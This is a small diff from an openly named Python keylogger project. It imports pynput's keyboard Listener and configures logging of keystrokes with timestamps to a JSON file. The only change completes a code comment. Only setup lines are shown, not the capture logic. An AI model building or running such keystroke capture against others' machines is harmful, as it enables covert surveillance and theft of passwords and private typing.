@@ -4,7 +4,7 @@
 # This file is aimed specifically for windowns systems, but when ran ON PURPOSE, will work on any system
 from pynput.keyboard import Key, Listener # import Key is for special keys/characters
                                           # import Listener is for recording key strokes
-import logging # Designed for 
+import logging # Designed for sending key inputs to a file
 
 logging.basicConfig(filename=("KeyLoggerProject/keylog.json"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
